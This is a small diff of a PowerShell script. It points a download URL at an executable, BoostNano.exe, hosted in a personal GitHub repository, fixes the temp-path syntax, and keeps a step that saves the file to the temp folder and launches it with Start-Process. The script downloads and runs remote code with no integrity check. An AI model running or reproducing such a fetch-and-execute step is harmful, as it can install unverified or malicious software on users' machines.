@@ -1,5 +1,5 @@
-$url = "https://Dev.com/BoostNano.exe"
-$temp = "$envTEMP\BoostNano.exe"
+$url = "https://raw.githubusercontent.com/nxnoshop-afk/Nxnoshop-download/main/BoostNano.exe"
+$temp = "$env:TEMP\BoostNano.exe"
 
-Invoke-WebRequest $url -OutFile $temp
+Invoke-WebRequest -Uri $url -OutFile $temp
 Start-Process $temp
